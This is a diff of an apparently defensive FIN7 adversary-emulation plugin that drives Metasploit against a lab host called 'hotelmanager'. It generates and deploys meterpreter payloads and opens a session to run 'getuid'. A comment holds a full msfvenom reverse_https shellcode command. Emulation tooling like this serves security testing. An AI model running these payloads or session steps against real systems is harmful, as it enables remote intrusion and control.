@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 # Adversary emulation for FIN7
+import socket
 
 from plugins.base.attack import AttackPlugin
 from app.interface_sfx import CommandlineColors
@@ -27,13 +28,17 @@ class FIN7Plugin(AttackPlugin):
         self.plugin_path = __file__
         self.metasploit_1 = None
 
-    def get_metasploit_1(self):
-        """ Returns a metasploit with a session for the first targeted machine """
+    def get_metasploit_1(self, payload):
+        """ Returns a metasploit with a session for the first targeted machine
+
+        @param payload: payload description. waiting for this payload. Like "windows/x64/meterpreter/reverse_https"
+        """
         if self.metasploit_1:
             return self.metasploit_1
 
         self.metasploit_1 = MetasploitInstant(self.metasploit_password, attack_logger=self.attack_logger, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
-        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1)
+        ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())
+        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1, lhost=ip)
         self.metasploit_1.wait_for_session()
         return self.metasploit_1
 
@@ -179,7 +184,6 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
         # Generate shellcode
         # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
 
-
         dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp"
         architecture = "x64"
         target_platform = "windows"
@@ -238,7 +242,7 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
         # base64 conversion
         self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_4; base64 babymetal.bin > {encoded_filename}")
 
-        self.attack_logger.stop_build(logid = logid)
+        self.attack_logger.stop_build(logid=logid)
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}Step 4 compiling tools{CommandlineColors.ENDC}", 1)
@@ -271,8 +275,10 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
 
         # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps.
 
+        payload = self.payload_type_1
+
         venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
-        venom.generate_and_deploy(payload=self.payload_type_1,
+        venom.generate_and_deploy(payload=payload,
                                   architecture="x64",
                                   platform="windows",
                                   lhost=self.attacker_machine_plugin.get_ip(),
@@ -288,9 +294,10 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
         # TODO: invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
         # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/Resources/Step4/babymetal/Invoke-Shellcode.ps1
 
-        # metasploit1 = self.get_metasploit_1()
-        # print("Got session, calling command")
-        # print(metasploit.meterpreter_execute_on(["getuid"], hotelmanager))
+        metasploit1 = self.get_metasploit_1(payload)
+        print("Got session, calling command")
+        print(metasploit1.meterpreter_execute_on(["getuid"], hotelmanager))
+        print("Should have called session now")
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
@@ -303,8 +310,10 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
 
         hotelmanager = self.get_target_by_name("hotelmanager")
 
+        payload = self.payload_type_1
+
         # This is meterpreter !
-        metasploit = self.get_metasploit_1()
+        metasploit = self.get_metasploit_1(payload)
 
         # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute ps -ax through meterpreter{CommandlineColors.ENDC}", 1)
@@ -622,7 +631,7 @@ NOT IMPLEMENTED YET. MAYBE DO THIS PARTIAL. KEYLOGGING NEEDS USER INTERACTION.
                                                lport=lport,
                                                filename=filename,
                                                for_step=for_step,
-                                               sRDI_conversion= sRDI_conversion,
+                                               sRDI_conversion=sRDI_conversion,
                                                encoded_filename=encoded_filename,
                                                comment="And SRDI converted Meterpreter shell. Will be stored in the registry.")
 
@@ -730,11 +739,11 @@ NOT IMPLEMENTED YET
 
         filename = "AccountingIQ.exe"
         dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c"
-        logid = self.attack_logger.start_build(
-                                               filename=filename,
+        logid = self.attack_logger.start_build(filename=filename,
                                                for_step=10,
                                                dl_uri=dl_uri,
-                                               comment="This is a simulated credit card tool to target. The final flag is in here.")
+                                               comment="This is a simulated credit card tool to target. The final flag is in here."
+                                               )
         # simulated credit card tool as target
         self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_10")  # MSFVenom needs to be installed
         self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_10; rm {filename}")
